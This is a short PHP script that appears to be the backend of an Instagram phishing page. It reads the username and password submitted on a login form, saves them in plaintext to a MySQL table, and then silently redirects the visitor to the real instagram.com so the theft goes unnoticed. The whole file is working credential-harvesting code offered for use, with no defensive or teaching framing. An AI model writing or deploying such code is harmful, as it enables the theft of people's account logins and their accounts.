<?php
session_start();

// --- Database configuration ---
$host = "localhost";
$dbname = "security";
$user = "root";   // your WAMP username
$pass = "";       // your WAMP password

try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $user, $pass);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// --- Handle form submission ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['username']) ? trim($_POST['username']) : ""; // map 'username' input to $email
    $password = isset($_POST['password']) ? trim($_POST['password']) : "";

    if (empty($email) || empty($password)) {
        die("Please fill in all fields.");
    }

    try {
        // Insert user into database
        $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
        $stmt->execute([
            ':email' => $email,
            ':password' => $password
        ]);

        // Store session
        $_SESSION['email'] = $email;

        // Redirect after successful submission
        header("Location: https://instagram.com"); // change to your page
        exit;
    } catch (PDOException $e) {
        die("Database error: " . $e->getMessage());
    }
} else {
    // If accessed directly
    header("Location: index.php");
    exit;
}
?>

